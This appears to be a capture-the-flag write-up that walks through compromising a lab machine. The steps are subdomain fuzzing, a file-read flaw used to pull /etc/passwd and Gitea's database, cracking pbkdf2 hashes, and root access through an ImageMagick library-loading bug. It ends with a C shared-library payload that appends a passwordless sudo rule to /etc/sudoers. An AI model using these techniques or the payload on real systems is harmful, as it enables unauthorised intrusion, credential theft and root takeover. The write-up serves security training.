-  I discovered a subdomain `dev` with ffuf.We'll come back to this later

-  On the main page,there is a route `/book` that helps to submit user forms.Using `Chrome Dev tools`,I noticed that the server makes a `POST` request
to another route `/download` to read files.

![image](https://github.com/user-attachments/assets/0357de7f-837e-42e3-8c69-ccd506d6ee4d)

- I tested the route and was able to read `/etc/passwd`.

![image](https://github.com/user-attachments/assets/0a3a236b-613b-45a5-a10a-7d5de27a0f97)

- There is a user `/developer` on the server who will be our main target till we gain foothold on the server.

```text
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

- `Gitea` runs on the subdomain `dev`.It also contains repositories for the flask app and docker config.

![image](https://github.com/user-attachments/assets/11d61cbc-fd00-4cc6-8bbc-cb32ba1287a5)

- The docker config contains the custom installation directory for gitea.

![image](https://github.com/user-attachments/assets/8aa9ad3d-c0f1-41bb-b543-f4da1be92cdb)

- After checking for necessary backend files for `Gitea`,I discovered the important ones which are `app.ini` and `gitea.db`.The `gitea.db` contains the pbkdf2 hashes for Gitea users which can be cracked.I was able to read it.

![image](https://github.com/user-attachments/assets/32effff5-67b6-4ced-ad11-3db616a6e38f)

- I got a one liner from [Oxdf](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#winrm) to extract and create pbkdf2 hashes

![image](https://github.com/user-attachments/assets/469286d1-2e60-4b25-8d95-038af68a2c8b)

- I cracked it with hashcat as also explained in the writeup

### PRIVESC-: Image Magick

-----------------

- I discovered this script in `/opt/scripts` that identify images with the `Image magick` binary.

![image](https://github.com/user-attachments/assets/86c903bb-3a5e-4a37-a70f-146f741e4f18)

- This version of image magick is vulnerable to Code Execution as explained here [Image Magick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).

![image](https://github.com/user-attachments/assets/784dd5a2-816c-4bc2-b9cd-d805ed93aa97)


- I tweaked the POC to grant root privileges by adding an `all` rule to the `/etc/sudoers` file.

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
  system("echo 'developer ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers");
  exit(0);
}
EOF
```
- I ran `sudo -l` to confirm if the rule has been added.
